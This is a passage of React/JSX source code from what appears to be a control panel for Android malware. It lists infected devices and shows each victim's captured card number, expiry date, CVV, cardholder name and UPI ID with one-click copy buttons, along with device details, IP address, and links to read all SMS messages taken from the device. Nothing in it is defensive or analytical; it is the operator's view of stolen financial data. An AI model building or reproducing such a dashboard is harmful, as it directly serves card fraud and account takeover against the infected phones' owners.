                    <div className="mb-3 rounded-xl border border-amber-500/30 bg-amber-500/10 p-3 shadow-sm">
                      <div className="flex items-center justify-between mb-1">
                        <span className="inline-flex items-center gap-1.5 text-xs font-bold text-amber-500 uppercase tracking-wide">
                          <CreditCard className="w-3.5 h-3.5" /> Card Captured
                        </span>
                        {cardNum && (
                          <button
                            onClick={(e) => copyToClipboard(cardNum, `card-${device.id}`, e)}
                            className="text-[11px] font-semibold text-amber-500 hover:underline flex items-center gap-1"
                          >
                            {copiedKey === `card-${device.id}` ? "Copied" : "Copy Card"}
                          </button>
                        )}
                      </div>
                      <div className="font-mono text-sm font-bold text-foreground tracking-wider">
                        {cardNum || "Card number logged in database"}
                      </div>
                      <div className="flex items-center gap-3 text-xs text-muted-foreground mt-1 font-mono">
                        {cardExp && <span>EXP: <strong className="text-foreground">{cardExp}</strong></span>}
                        {cardCvv && <span>CVV: <strong className="text-foreground">{cardCvv}</strong></span>}
                        {cardHolder && <span className="truncate">NAME: {cardHolder}</span>}
                      </div>
                    </div>
                  )}

                  {/* UPI Alert (if present) */}
                  {device.upi && (
                    <div className="mb-3 rounded-xl border border-primary/30 bg-primary/10 p-2.5 flex items-center justify-between gap-2">
                      <div className="min-w-0 flex items-center gap-2">
                        <Zap className="w-4 h-4 text-primary shrink-0" />
                        <div className="truncate">
                          <span className="text-[10px] text-muted-foreground uppercase font-bold block">UPI ID</span>
                          <span className="font-mono text-xs font-bold text-foreground truncate block">
                            {device.upi}
                          </span>
                        </div>
                      </div>
                      <button
                        onClick={(e) => copyToClipboard(device.upi, `upi-${device.id}`, e)}
                        className="text-xs font-semibold text-primary hover:underline shrink-0"
                      >
                        {copiedKey === `upi-${device.id}` ? "Copied" : "Copy"}
                      </button>
                    </div>
                  )}

                  {/* Device Specs Grid */}
                  <div className="grid grid-cols-2 gap-2 text-xs mb-4">
                    <div className="p-2 rounded-lg bg-muted/40 border border-card-border/60">
                      <span className="page-eyebrow text-[9px] block">Network / Carrier</span>
                      <span className="font-mono text-[11px] text-foreground font-medium truncate block">
                        {device.raw.service_provider || device.sim1 || "Cellular / Wi-Fi"}
                      </span>
                    </div>

                    <div className="p-2 rounded-lg bg-muted/40 border border-card-border/60">
                      <span className="page-eyebrow text-[9px] block">Android & SDK</span>
                      <span className="font-mono text-[11px] text-foreground font-medium truncate block">
                        {device.androidV ? `Android ${device.androidV}` : "—"}
                        {device.sdkV ? ` (SDK ${device.sdkV})` : ""}
                      </span>
                    </div>

                    <div className="p-2 rounded-lg bg-muted/40 border border-card-border/60">
                      <span className="page-eyebrow text-[9px] block">IP Address</span>
                      <span className="font-mono text-[11px] text-muted-foreground truncate block">
                        {device.ip_address || "—"}
                      </span>
                    </div>

                    <div className="p-2 rounded-lg bg-muted/40 border border-card-border/60">
                      <span className="page-eyebrow text-[9px] block">Storage</span>
                      <span className="font-mono text-[11px] text-muted-foreground truncate block">
                        {device.storage || "—"}
                      </span>
                    </div>
                  </div>
                </div>

                {/* Footer Action Buttons */}
                <div className="pt-3 border-t border-card-border/80 flex items-center justify-between gap-2">
                  <div className="flex items-center gap-1.5 text-xs text-muted-foreground min-w-0">
                    {isVerifiedDevice ? (
                      <span className="inline-flex items-center gap-1 text-emerald-600 dark:text-emerald-400 font-semibold text-[11px] truncate">
                        <ShieldCheck className="w-3.5 h-3.5 text-emerald-500 shrink-0" />
                        {device.messageCount ? `${device.messageCount.toLocaleString()} SMS` : "SMS Validated"}
                      </span>
                    ) : (
                      <span className="text-[11px] text-muted-foreground truncate">
                        {device.joined ? `Joined ${device.joined}` : "Registered"}
                      </span>
                    )}
                  </div>

                  <div className="flex items-center gap-2">
                    <Link
                      href={`/all-sms?device=${device.id}`}
                      className="px-2.5 py-1.5 rounded-xl text-xs font-semibold border border-card-border bg-card hover:bg-muted text-muted-foreground hover:text-foreground transition-all flex items-center gap-1"
                      title="Inspect all SMS from this device"
                    >
                      <MessageSquare className="w-3 h-3" /> SMS
                    </Link>

                    <Link
                      href={`/device/${device.id}`}
                      className="px-3 py-1.5 rounded-xl text-xs font-semibold bg-primary text-primary-foreground shadow-sm shadow-primary/20 hover:bg-primary/90 transition-all flex items-center gap-1 group/btn"
                    >
                      Inspect <ChevronRight className="w-3.5 h-3.5 group-hover/btn:translate-x-0.5 transition-transform" />
                    </Link>
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      )}
    </Layout>
  );
}
